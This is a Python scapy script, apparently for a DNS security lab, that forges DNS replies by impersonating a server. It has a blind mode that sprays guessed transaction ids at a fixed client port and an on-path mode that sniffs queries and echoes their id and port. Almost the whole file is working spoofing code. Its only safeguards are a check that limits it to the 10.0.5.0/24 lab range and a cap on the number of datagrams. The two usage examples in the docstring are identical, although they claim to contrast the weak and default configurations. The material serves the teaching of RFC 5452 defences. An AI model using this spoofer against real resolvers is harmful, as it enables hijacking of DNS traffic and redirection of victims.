#!/usr/bin/env python3
"""Blind (off-path) DNS spoof generator for the M15 lab - the RFC 5452 lesson.

An off-path attacker cannot see the client's query, so it must *guess* the
transaction id (16 bits) and, because the client's kernel picks the source
port, that port too (16 bits). `--weak` in dnsq gives both of them away
(predictable id from 1, fixed source port 53053); the default configuration
uses getrandom for the id and an ephemeral source port.

modes:
  blind    spray forged replies at a fixed client port with a range of ids
  onpath   sniff the query and echo its id/port (reference: on-path defeats
           the message-level matcher; only DNSSEC fixes that - out of scope)

Run inside the dnslab on `evil`, e.g.:

  # against --weak (predictable id, fixed port 53053): a tiny id burst wins
  sudo lab/ex evil python3 py/dns_spoof.py eth0 --server 10.0.5.3 \
      --client 10.0.5.10 --answer 10.0.5.66 \
      --mode blind --client-port 53053 --id-start 1 --id-count 4 --count 400

  # against the default (random id + port): the same burst cannot hit
  sudo lab/ex evil python3 py/dns_spoof.py eth0 --server 10.0.5.3 \
      --client 10.0.5.10 --answer 10.0.5.66 \
      --mode blind --client-port 53053 --id-start 1 --id-count 4 --count 400

Bounded by --count. Refuses any address outside 10.0.5.0/24, so it cannot be
pointed at a real network by accident.
"""
import argparse
import ipaddress
import time

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, get_if_addr, sniff, send

LAB = ipaddress.ip_network("10.0.5.0/24")


def build(args, client_port, rid):
    qname = args.name.rstrip(".") + "."
    return (IP(src=args.server, dst=args.client) /
            UDP(sport=53, dport=client_port) /
            DNS(id=rid, qr=1, aa=1, rd=1, ra=0,
                qd=DNSQR(qname=qname, qtype=args.qtype),
                an=DNSRR(rrname=qname, ttl=300, rdata=args.answer)))


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("iface", help="interface to inject on (inside the namespace)")
    ap.add_argument("--server", required=True, help="server address to impersonate")
    ap.add_argument("--client", required=True, help="victim resolver address")
    ap.add_argument("--answer", default="10.0.5.66", help="address in the forged answer")
    ap.add_argument("--name", default="www.example.test", help="qname to forge")
    ap.add_argument("--qtype", type=int, default=1, help="qtype number (1 = A)")
    ap.add_argument("--mode", default="blind", choices=["blind", "onpath"])
    ap.add_argument("--client-port", type=int, default=53053,
                    help="blind: the fixed destination port to spray (weak mode)")
    ap.add_argument("--id-start", type=int, default=1, help="blind: first id to try")
    ap.add_argument("--id-count", type=int, default=4, help="blind: ids to cycle through")
    ap.add_argument("--count", type=int, default=400, help="max forged datagrams")
    ap.add_argument("--timeout", type=int, default=10, help="onpath: sniff timeout seconds")
    args = ap.parse_args()

    for name in ("server", "client", "answer"):
        a = ipaddress.ip_address(getattr(args, name))
        if a not in LAB:
            raise SystemExit(f"{name} {a} is not in {LAB}: refusing (lab only)")
    if args.answer == args.server:
        raise SystemExit("answer must differ from the server we impersonate")

    if args.mode == "blind":
        print(f"ready: blind spray {args.client}:{args.client_port} ids "
              f"{args.id_start}..{args.id_start + args.id_count - 1} "
              f"x{args.count} from {args.server}:53 -> {args.answer}", flush=True)
        sent = 0
        while sent < args.count:
            rid = args.id_start + (sent % args.id_count)
            send(build(args, args.client_port, rid & 0xffff),
                 iface=args.iface, verbose=False)
            sent += 1
        print(f"sent {sent} forged replies", flush=True)
        return

    # onpath: read a query and echo its id + source port
    evil_ip = get_if_addr(args.iface)
    state = {"n": 0}

    def handle(pkt):
        if DNS not in pkt or pkt[DNS].qr != 0 or pkt[DNS].qd is None:
            return
        if pkt[IP].src != args.client or pkt[IP].dst != args.server:
            return
        reply = build(args, pkt[UDP].sport, pkt[DNS].id)
        send(reply, iface=args.iface, verbose=False)
        state["n"] += 1
        print(f"#{state['n']} onpath: echoed id=0x{pkt[DNS].id:04x} "
              f"port={pkt[UDP].sport} (evil={evil_ip})", flush=True)
        if state["n"] >= args.count:
            raise SystemExit(0)

    print(f"ready (evil={evil_ip}, onpath against {args.client})", flush=True)
    sniff(iface=args.iface, filter=f"udp and dst port 53 and src host {args.client}",
          prn=handle, store=False, timeout=args.timeout)


if __name__ == "__main__":
    main()
